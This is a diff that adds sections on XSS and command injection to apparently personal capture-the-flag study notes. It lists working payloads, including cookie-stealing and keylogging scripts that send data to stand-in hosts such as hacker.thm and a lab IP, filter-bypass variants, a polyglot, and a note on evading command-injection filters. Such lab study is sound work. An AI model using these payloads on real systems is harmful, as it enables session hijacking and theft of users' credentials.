@@ -316,3 +316,145 @@ x/../private
 ```
 
 this will change your icon to have the encoded flag
+
+## XXS (Cross-Site Scripting)
+
+Examples from the site on how XSS is exploited
+
+```
+Proof Of Concept:
+
+This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:
+
+
+<script>alert('XSS');</script>
+
+
+Session Stealing:
+
+Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.
+
+
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+
+Key Logger:
+
+The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.
+
+
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+
+Business Logic:
+
+This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:
+
+
+<script>user.changeEmail('attacker@hacker.thm');</script>
+
+
+Now that the email address for the account has changed, the attacker may perform a reset password attack.
+
+```
+
+### Reflected XSS
+
+* This is when the user's supplied data in a HTTP request is included in the webpage source without any validation
+
+Points of entry
+
+```
+Parameters in the URL Query String
+URL File Path
+Sometimes HTTP Headers (although unlikely exploitable in practice)
+```
+
+### Stored XSS
+
+* Stored in the webapp, for eg in the db, and will execute when someone hits the site.
+
+Points of entry
+
+```
+Comments on a blog
+User profile information
+Website Listings
+```
+
+Good example
+
+```
+ for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads. 
+
+```
+
+### DOM XSS
+
+* When JS execution happens directly from within the browser without any new pages being loaded
+
+how to exploit
+
+```
+The website's JavaScript gets the contents from the window.location.hash parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
+
+DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You'd need to look for parts of the code that access certain variables that an attacker can have control over, such as "window.location.x" parameters.
+
+
+When you've found those bits of code, you'd then need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as eval().
+```
+
+### Blind XSS
+
+* Blind XSS is similar to a stored XSS (which we covered in task 4) in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.
+
+```
+When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.
+
+
+A popular tool for Blind XSS attacks is xsshunter. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.
+```
+
+### Types of XSS
+
+```
+<script>alert('THM');</script>
+
+"><script>alert('THM');</script>
+
+</textarea><script>alert('THM');</script>
+
+';alert('THM');//
+
+<sscriptcript>alert('THM');</sscriptcript>
+
+/images/cat.jpg" onload="alert('THM');
+
+```
+
+#### Polygots:
+
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
+
+#### Practice
+
+```
+</textarea><script>fetch('http://10.4.28.132:9001?cookie=' + btoa(document.cookie) );</script>
+</textarea><script>fetch('http://c3ac354fddd44cad6846712677407ff5.log.tryhackme.tech?cookie=' + btoa(document.cookie) );</script>
+```
+
+## Command injections
+
+* 2 Types:
+  * Bind: This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviours of the application to determine whether or not your payload was successful.
+  * This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the whoami command to see what user the application is running under. The web application will output the username on the page directly.
+
+```
+Bypassing Filters
+
+Applications will employ numerous techniques in filtering and sanitising data that is taken from a  user's input. These filters will restrict you to specific payloads; however, we can abuse the logic behind an application to bypass these filters. For example, an application may strip out quotation marks; we can instead use the hexadecimal value of this to achieve the same result.
+
+When executed, although the data given will be in a different format than what is expected, it can still be interpreted and will have the same result.
+```
